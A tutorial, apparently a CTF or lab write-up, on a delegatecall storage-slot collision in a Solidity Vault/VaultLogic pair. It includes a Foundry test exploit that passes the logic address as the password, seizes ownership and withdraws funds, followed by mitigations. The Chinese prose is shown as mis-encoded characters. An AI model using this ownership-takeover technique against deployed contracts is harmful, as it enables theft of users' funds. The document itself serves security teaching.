# Vault åˆçº¦æ¼æ´å­¦ä¹ æŒ‡å—

## ğŸ“š ç¬¬ä¸€æ­¥ï¼šç†è§£ VaultLogic åˆçº¦

è®©æˆ‘ä»¬å…ˆçœ‹çœ‹ `VaultLogic` åˆçº¦çš„ç»“æ„ï¼š

```solidity
contract VaultLogic {
    address public owner;     // å­˜å‚¨æ§½ 0
    bytes32 private password; // å­˜å‚¨æ§½ 1

    constructor(bytes32 _password) public {
        password = _password;
        owner = msg.sender;
    }

    function changeOwner(bytes32 _password, address _owner) public {
        if (password == _password) {
            owner = _owner;
        } else {
            revert("password error");
        }
    }
}
```

### ğŸ” VaultLogic åˆçº¦åˆ†æï¼š

1. **çŠ¶æ€å˜é‡**ï¼š
   - `owner`ï¼šåˆçº¦çš„æ‹¥æœ‰è€…åœ°å€ï¼ˆå­˜å‚¨åœ¨æ§½ 0ï¼‰
   - `password`ï¼šç§æœ‰å¯†ç ï¼ˆå­˜å‚¨åœ¨æ§½ 1ï¼‰

2. **åŠŸèƒ½**ï¼š
   - `changeOwner`ï¼šéªŒè¯å¯†ç åæ›´æ”¹åˆçº¦æ‹¥æœ‰è€…

## ğŸ“š ç¬¬äºŒæ­¥ï¼šç†è§£ Vault åˆçº¦

```solidity
contract Vault {
    address public owner;                    // å­˜å‚¨æ§½ 0
    VaultLogic logic;                       // å­˜å‚¨æ§½ 1
    mapping (address => uint) deposites;    // å­˜å‚¨æ§½ 2
    bool public canWithdraw = false;        // å­˜å‚¨æ§½ 3

    fallback() external {
        (bool result,) = address(logic).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

### ğŸ” Vault åˆçº¦åˆ†æï¼š

1. **çŠ¶æ€å˜é‡**ï¼š
   - `owner`ï¼šåˆçº¦æ‹¥æœ‰è€…ï¼ˆå­˜å‚¨åœ¨æ§½ 0ï¼‰
   - `logic`ï¼šVaultLogic åˆçº¦å®ä¾‹ï¼ˆå­˜å‚¨åœ¨æ§½ 1ï¼‰
   - `deposites`ï¼šç”¨æˆ·å­˜æ¬¾æ˜ å°„ï¼ˆå­˜å‚¨åœ¨æ§½ 2ï¼‰
   - `canWithdraw`ï¼šæ˜¯å¦å…è®¸ææ¬¾ï¼ˆå­˜å‚¨åœ¨æ§½ 3ï¼‰

2. **å…³é”®å‡½æ•°**ï¼š
   - `fallback()`ï¼šä½¿ç”¨ delegatecall è°ƒç”¨ logic åˆçº¦
   - `openWithdraw()`ï¼šåªæœ‰ owner å¯ä»¥å¼€å¯ææ¬¾åŠŸèƒ½
   - `withdraw()`ï¼šæå–ç”¨æˆ·å­˜æ¬¾

## ğŸš¨ ç¬¬ä¸‰æ­¥ï¼šç†è§£ delegatecall çš„å·¥ä½œåŸç†

### ä»€ä¹ˆæ˜¯ delegatecallï¼Ÿ

`delegatecall` æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°è°ƒç”¨æ–¹å¼ï¼š

```
æ™®é€š callï¼š
åˆçº¦A --call--> åˆçº¦B
- åœ¨åˆçº¦Bçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ
- ä¿®æ”¹åˆçº¦Bçš„å­˜å‚¨

delegatecallï¼š
åˆçº¦A --delegatecall--> åˆçº¦B
- åœ¨åˆçº¦Açš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œåˆçº¦Bçš„ä»£ç 
- ä¿®æ”¹åˆçº¦Açš„å­˜å‚¨ï¼
```

### ğŸ“Š å­˜å‚¨æ§½å¸ƒå±€å¯¹æ¯”å›¾ï¼š

```
VaultLogic åˆçº¦å­˜å‚¨å¸ƒå±€ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ§½ 0    â”‚ owner        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ§½ 1    â”‚ password     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Vault åˆçº¦å­˜å‚¨å¸ƒå±€ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ§½ 0    â”‚ owner        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ§½ 1    â”‚ logic        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ§½ 2    â”‚ deposites    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ§½ 3    â”‚ canWithdraw  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## âš ï¸ ç¬¬å››æ­¥ï¼šå‘ç°å­˜å‚¨æ§½å†²çªæ¼æ´

### é—®é¢˜æ‰€åœ¨ï¼š

å½“ Vault é€šè¿‡ `delegatecall` è°ƒç”¨ VaultLogic çš„ `changeOwner` å‡½æ•°æ—¶ï¼š

1. **VaultLogic è®¤ä¸º**ï¼š
   - æ§½ 0 = owner
   - æ§½ 1 = password

2. **å®é™…åœ¨ Vault ä¸­**ï¼š
   - æ§½ 0 = owner
   - æ§½ 1 = logic åˆçº¦åœ°å€

### ğŸ¯ æ¼æ´åˆ©ç”¨æµç¨‹å›¾ï¼š

```
æ”»å‡»æ­¥éª¤ï¼š
1. è°ƒç”¨ Vault.fallback() 
   â†“
2. delegatecall åˆ° VaultLogic.changeOwner()
   â†“
3. VaultLogic æ£€æŸ¥ passwordï¼ˆæ§½ 1ï¼‰
   å®é™…æ£€æŸ¥çš„æ˜¯ Vault çš„ logic åœ°å€
   â†“
4. å¦‚æœå¯†ç æ­£ç¡®ï¼ˆä¼ å…¥ logic åœ°å€ï¼‰
   VaultLogic ä¿®æ”¹ ownerï¼ˆæ§½ 0ï¼‰
   å®é™…ä¿®æ”¹çš„æ˜¯ Vault çš„ owner
   â†“
5. æ”»å‡»è€…æˆä¸º Vault çš„ owner
   â†“
6. è°ƒç”¨ openWithdraw() å¼€å¯ææ¬¾
   â†“
7. è°ƒç”¨ withdraw() æå–æ‰€æœ‰èµ„é‡‘
```

## ğŸ’» ç¬¬äº”æ­¥ï¼šæ”»å‡»ä»£ç è¯¦ç»†è§£é‡Š

è®©æˆ‘ä»¬é€è¡Œåˆ†ææ”»å‡»ä»£ç ï¼š

```solidity
function testExploit() public {
    // 1. æ”»å‡»è€…å…ˆå­˜å…¥ä¸€äº›èµ„é‡‘
    vm.startPrank(palyer);
    vault.deposite{value: 0.01 ether}();
```
**è§£é‡Š**ï¼šæ”»å‡»è€…å…ˆå­˜å…¥ 0.01 ETHï¼Œè¿™æ ·å°±æœ‰ææ¬¾çš„æƒé™ã€‚

```solidity
    // 2. å‡†å¤‡æ”»å‡»å‚æ•°
    bytes32 logicAddress = bytes32(uint256(uint160(address(logic))));
    bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddress, palyer);
```
**è§£é‡Š**ï¼š
- è·å– logic åˆçº¦åœ°å€å¹¶è½¬æ¢ä¸º bytes32 æ ¼å¼
- ç¼–ç å‡½æ•°è°ƒç”¨æ•°æ®ï¼Œä¼ å…¥ logic åœ°å€ä½œä¸ºå¯†ç ï¼Œpalyer ä½œä¸ºæ–° owner

```solidity
    // 3. æ‰§è¡Œæ”»å‡»
    (bool success,) = address(vault).call(data);
    require(success, "changeOwner failed");
```
**è§£é‡Š**ï¼š
- è°ƒç”¨ Vault åˆçº¦ï¼Œè§¦å‘ fallback å‡½æ•°
- fallback å‡½æ•°ä½¿ç”¨ delegatecall è°ƒç”¨ VaultLogic.changeOwner
- ç”±äºå­˜å‚¨æ§½å†²çªï¼ŒæˆåŠŸå°† Vault çš„ owner æ”¹ä¸º palyer

```solidity
    // 4. å¼€å¯ææ¬¾å¹¶æå–èµ„é‡‘
    vault.openWithdraw();  // ç°åœ¨ palyer æ˜¯ ownerï¼Œå¯ä»¥å¼€å¯ææ¬¾
    vault.withdraw();      // æå–æ”»å‡»è€…çš„èµ„é‡‘
```

## ğŸ›¡ï¸ ç¬¬å…­æ­¥ï¼šå¦‚ä½•é˜²èŒƒæ­¤ç±»æ¼æ´

1. **é¿å…å­˜å‚¨æ§½å†²çª**ï¼š
   - ä½¿ç”¨ç›¸åŒçš„å­˜å‚¨å¸ƒå±€
   - æˆ–ä½¿ç”¨ä»£ç†æ¨¡å¼çš„æ ‡å‡†å®ç°

2. **è°¨æ…ä½¿ç”¨ delegatecall**ï¼š
   - ç¡®ä¿è¢«è°ƒç”¨åˆçº¦æ˜¯å¯ä¿¡çš„
   - éªŒè¯å­˜å‚¨å¸ƒå±€å…¼å®¹æ€§

3. **ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼**ï¼š
   - æ ‡å‡†åŒ–çš„å®ç°
   - ç»è¿‡å®‰å…¨å®¡è®¡

## ğŸ¯ æ€»ç»“

è¿™ä¸ªæ¼æ´çš„æ ¸å¿ƒæ˜¯ï¼š
- **delegatecall** åœ¨è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç 
- **å­˜å‚¨æ§½å†²çª** å¯¼è‡´æ„å¤–çš„çŠ¶æ€ä¿®æ”¹
- **æƒé™ç»•è¿‡** è®©æ”»å‡»è€…è·å¾—åˆçº¦æ§åˆ¶æƒ

é€šè¿‡ç†è§£è¿™äº›æ¦‚å¿µï¼Œä½ å°±èƒ½æ˜ç™½ä¸ºä»€ä¹ˆæ”»å‡»èƒ½å¤ŸæˆåŠŸï¼Œä»¥åŠå¦‚ä½•åœ¨æœªæ¥é¿å…ç±»ä¼¼çš„å®‰å…¨é—®é¢˜ã€‚